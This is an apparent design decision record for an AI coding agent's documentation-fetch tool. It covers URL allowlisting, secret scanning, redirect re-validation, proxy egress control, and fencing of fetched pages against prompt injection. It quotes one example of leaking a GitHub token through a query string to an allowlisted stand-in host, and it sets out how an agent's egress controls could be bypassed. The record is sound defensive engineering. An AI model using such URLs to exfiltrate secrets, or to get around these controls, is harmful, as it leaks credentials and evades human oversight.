# D-075: The worker fetches documentation, not the agent — and the URL is the channel that needed closing (PD-310)

**Decision:** The Robot gets documentation through `mcp__docs__fetch`, an **in-process SDK tool the
worker implements** ([[D-044]]'s `propose_commit` pattern). The agent's only input is a URL; the
worker builds and sends the request. `WebFetch` and `WebSearch` stay out of `ROBOT_TOOLS`, so
[[D-068]]'s built-in allowlist is **unchanged** — `tools` governs built-in tools, and an MCP server
registered via `mcpServers` is orthogonal to it. A curated baseline of doc domains
(`BASELINE_DOC_DOMAINS` in `packages/shared`) is readable with **no human in the loop at all**;
anything else is refused and routed to the existing `.robot/ask-human` park.

**Reasoning:**

- **"The worker fetches" is a structural guarantee, not a policy.** The request is *built* without a
  credential rather than *inspected* for one. There is no header to strip and no body to scan
  because the shape has nowhere to put either. Admitting `WebFetch` and adding rules on top would
  have given a weaker property for more work.
- **Squid structurally could not do the scanning Steve asked for.** The proxy sees only
  `CONNECT host:443` — not the method, path, headers, or body. Getting content inspection there
  means `ssl_bump`: a CA private key in the container, that CA trusted by the agent runtime, and
  decryption of every legitimate `Authorization` header to `api.github.com` and `api.anthropic.com`,
  so the scanner would see real tokens constantly and must never false-positive on them. Rejected;
  recorded here so it is not re-proposed. The worker holds the URL in plaintext, so the check the
  proxy could not do is trivial one layer up.
- **GET-only removes one channel and leaves the other wide open.** This is the finding that shaped
  the tool. `GET https://docs.allowed.example/search?q=ghp_<token>` is an allowlisted host receiving
  a secret, and the URL is agent-controlled. So the URL itself gets real controls: **no query
  string** on documentation fetches (closed by construction, not by detection — doc reads never need
  one), a scan for **credential prefixes and for the literal values of the worker's own env
  secrets** (exact-match, no false positives, catches the case that actually matters), a length cap,
  and no `user:pass@` userinfo. Refuse and surface; never silently strip.
- **Redirects are re-validated on every hop.** A `302` from an allowlisted host to an arbitrary one
  is the classic bypass, and `fetch`'s default `redirect: 'follow'` takes it silently and reports a
  200 — the caller never learns where the bytes came from. `redirect: 'manual'` plus an explicit
  loop is the only way the allowlist stays meaningful. Squid would also refuse the off-list host,
  but resting the tool's own guarantee on a config file in another container is not a guarantee.
- **Fetched content is fenced as data, not instruction.** A fetched page is attacker-influenced text
  entering the context of an agent holding repo write access and a GitHub token, and one baseline
  domain (`reddit.com`) serves user-submitted content *by design*. `fenceFetchedContent` states what
  the block is and what authority it lacks, **before** the body — the same move `orientationFraming()`
  makes for injected documents ([[D-071]]). After the body it would be read too late, and a long page
  could push it out of view.
- **Defence in depth is preserved, and the layers now divide cleanly.** `shared/proxy.ts` already
  installs a global undici dispatcher, so the worker's own `fetch` goes through squid — a bug in the
  tool's allowlist check does not by itself open egress. Squid decides **which hosts are reachable
  at all**; the tool decides **what may be sent to them**. Previously the two would have overlapped;
  now neither is redundant.
- **The baseline is deliberately generous.** An off-baseline fetch costs a full park-and-resume
  cycle, so a thin list does not make the system safer — it makes the Robot park constantly, and a
  human approving `vitest.dev` for the fourth time is clicking yes, not exercising judgement. The
  cost of a wrong entry is bounded by the URL rules above; the cost of a missing one is paid on every
  run.
- **A baseline domain is not an unrestricted one.** `BASELINE_DOC_DOMAINS` governs hosts only. Every
  fetch, baseline or granted, still goes through `validateDocUrl`. Worth stating because "allowlisted"
  reads as "trusted" and here it means only "reachable".
- **The list lives in `shared`, not the worker,** so PD-501's Allowlists widget renders the same list
  the worker enforces instead of a transcription of it. That drift *was* PD-496: `buildContextPack`
  searched for a heading PROJECT.md had renamed, so Refine and Audit silently lost the glossary for
  weeks while both specs passed against fixtures containing the heading they searched for.
- **A domain missing from `squid.conf` fails at the proxy,** surfacing to the agent as a network
  error rather than a policy decision — silent, and one-directional. `doc-allowlist.spec.ts` asserts
  the baseline is mirrored in `squid.conf`, so the drift breaks a test instead of a run.

**Implications:** `ops/agent-worker/squid.conf` gains the doc domains, which makes this a sensitive
path ([[D-047]]/[[D-067]]) requiring a human `sensitive-change-approved` ack. `DOCS_FETCH_RULE` is
its own exported constant so the Agent Glossary shows the Robot's exact wording rather than a
paraphrase.

**Deferred, deliberately:** the four-button approval UI (one-time / permanent × allow / deny) and
runtime-mutable grants. Both are blocked on the same unsolved piece — **a granted domain is inert
until it also reaches squid**, and the mechanism for that (a file-backed squid ACL written by the
server, reconfigured by a watcher inside the squid container) is the hard part. It must NOT be done
by giving the agent-worker container the docker socket: that is root-equivalent on the host, a far
larger hole than the allowlist it would be managing, handed to the container agents run in. Until
then an off-baseline need is a park with a human answer, which is the honest version of the same
control. PD-501 exists to make the resulting boundary visible.

**Revisit if:** the Robot repeatedly parks for the same off-baseline domain — that is the signal the
baseline needs an entry, and it is a normal PR, not a UI. Or if a doc host genuinely requires a query
parameter, in which case allowlist that host *with* a parameter whitelist rather than opening query
strings generally.
